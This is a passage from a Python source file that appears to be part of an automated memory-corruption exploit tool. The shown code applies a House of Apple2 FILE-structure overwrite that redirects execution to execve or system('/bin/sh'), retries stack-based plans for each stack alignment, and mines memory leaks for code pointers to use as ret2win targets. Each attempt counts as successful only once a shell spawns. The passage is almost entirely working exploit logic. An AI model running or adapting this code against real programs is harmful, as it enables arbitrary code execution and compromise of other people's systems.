                    fp, flags=flags, wide_data=wide, wide_vtable=scratch,
                    wfile_jumps=base + T["wfile_jumps"], setcontext=base + T["setcontext"],
                    fields=T["fields"], rip_at=T["rip_at"], rip=base + T["execve"],
                    rdi=base + T["binsh"], rsi=0, rdx=0)
            else:
                cells = _heap.house_of_apple2_cells(fp, wide_data=wide, wide_vtable=scratch,
                                                    wfile_jumps=base + T["wfile_jumps"],
                                                    system=base + T["system"])
            shown = [(hex(a), hex(v)) for a, v in cells]
            for addr, val in cells:
                _op(write_cell(addr, val))
                if val not in _read(addr):
                    return {"ok": False, "libc_base": base, "cells": shown,
                            "reason": f"cell {addr:#x} := {val:#x} did not read back; the write "
                                      "primitive does not reach that address"}
            for seq in (tuple(exit_seqs) or (b"",)):
                out = _op(seq, 0.6) if seq else b""
                out += _op(markers.command + b"\n", 1.2)
                if markers.proves(out):
                    return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
                            "cells": shown, "fp_name": T["fp_name"], "exit_seq": seq,
                            "targets": {k: v for k, v in T.items() if k != "fp_name"}}
                if p.poll() is not None:
                    break
            return {"ok": False, "libc_base": base, "cells": shown,
                    "reason": f"the {len(cells)} cells landed but no trigger spawned a shell "
                              f"(exit {p.poll()!r})"}
        finally:
            sandbox.kill_quietly(p)

    # `stack` is run twice, once per rsp parity: `system`'s prologue has a `movaps` and the
    # parity depends on where main's frame happens to sit, so one of the two segfaults. They
    # cannot share a process -- the losing one dies.
    attempts = []
    for plan in runnable:
        attempts += ([("stack", True), ("stack", False)] if plan == "stack" else [(plan, False)])

    tried, last = [], None
    for plan, align in attempts:
        last = _attempt(plan, align=align)
        last["plan"] = plan
        tried.append(plan if plan != "stack" else f"stack(align={align})")
        if last.get("ok"):
            break
    last["plans_tried"] = tried
    return last


# --- disclosed code pointers ---------------------------------------------------------------------
# A memory disclosure often leaks CODE pointers: a saved return address, a stored callback, a
# vtable entry. On a STRIPPED binary whose win()-like function is reached only through such a
# stored pointer, the disassembler never analyses it (no call references it) and `find_win` cannot
# see it -- but the leak hands its runtime address over directly. These extract those pointers so
# the exploit stage can try each as a ret2win target, CONFIRMED by a spawned shell (so a pointer
# that is not a shell-spawner is rejected, not faked).

def executable_vaddr_ranges(data: bytes) -> list:
    """[(lo, hi)] virtual-address ranges of the PF_X PT_LOAD segments, from the program headers.
    Needs no symbols, so it works on a stripped binary."""
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return []
    is64 = data[4] == 2
    endc = "<" if data[5] == 1 else ">"
    try:
        if is64:
            e_phoff = struct.unpack_from(endc + "Q", data, 0x20)[0]
            e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 0x36)
        else:
            e_phoff = struct.unpack_from(endc + "I", data, 0x1c)[0]
            e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 0x2a)
        out = []
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            if is64:
                p_type, p_flags = struct.unpack_from(endc + "II", data, off)
                p_vaddr = struct.unpack_from(endc + "Q", data, off + 0x10)[0]
                p_memsz = struct.unpack_from(endc + "Q", data, off + 0x28)[0]
            else:
                p_type = struct.unpack_from(endc + "I", data, off)[0]
                p_vaddr = struct.unpack_from(endc + "I", data, off + 0x8)[0]
                p_memsz = struct.unpack_from(endc + "I", data, off + 0x14)[0]
                p_flags = struct.unpack_from(endc + "I", data, off + 0x18)[0]
            if p_type == 1 and (p_flags & 0x1) and p_memsz:      # PT_LOAD && PF_X
                out.append((p_vaddr, p_vaddr + p_memsz))
        return out
    except Exception:
        observe.absorbed(_log, "no program headers")
        return []


def disclosed_code_pointers(blob: bytes, ranges, *, word: int = 8, limit: int = 8) -> list:
    """Values in `blob` (scanned at every byte offset, little-endian) that fall inside one of the
    executable `ranges` -- i.e. leaked code pointers -- ordered by how often each appears (a
    deliberately-stored callback is leaked more than once, so the most-repeated pointer is the
    best win candidate), then by address. At most `limit`."""
    if not ranges or len(blob) < word:
        return []
    from collections import Counter
    counts: Counter = Counter()
    for i in range(0, len(blob) - word + 1):
        v = int.from_bytes(blob[i:i + word], "little")
        if any(lo <= v < hi for lo, hi in ranges):
            counts[v] += 1
    return [v for v, _ in sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))][:limit]
